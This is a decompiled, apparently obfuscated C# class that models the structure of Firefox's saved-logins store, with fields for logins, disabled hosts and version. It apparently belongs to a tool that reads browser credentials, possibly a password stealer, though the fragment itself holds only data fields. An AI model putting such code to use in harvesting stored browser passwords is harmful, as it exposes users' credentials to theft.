using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace who.Gecko
{
	// Token: 0x02000032 RID: 50
	public class Gecko3
	{
		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000188 RID: 392 RVA: 0x00002B2A File Offset: 0x00000D2A
		// (set) Token: 0x06000189 RID: 393 RVA: 0x00002B32 File Offset: 0x00000D32
		public int nextId { get; set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x0600018A RID: 394 RVA: 0x00002B3B File Offset: 0x00000D3B
		// (set) Token: 0x0600018B RID: 395 RVA: 0x00002B43 File Offset: 0x00000D43
		public Gecko5[] logins { get; set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600018C RID: 396 RVA: 0x00002B4C File Offset: 0x00000D4C
		// (set) Token: 0x0600018D RID: 397 RVA: 0x00002B54 File Offset: 0x00000D54
		public object[] disabledHosts { get; set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x0600018E RID: 398 RVA: 0x00002B5D File Offset: 0x00000D5D
		// (set) Token: 0x0600018F RID: 399 RVA: 0x00002B65 File Offset: 0x00000D65
		public int version { get; set; }

		// Token: 0x06000190 RID: 400 RVA: 0x0000276F File Offset: 0x0000096F
		public Gecko3()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x040000AA RID: 170
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_0;

		// Token: 0x040000AB RID: 171
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private Gecko5[] gecko5_0;

		// Token: 0x040000AC RID: 172
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private object[] object_0;

		// Token: 0x040000AD RID: 173
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_1;
	}
}
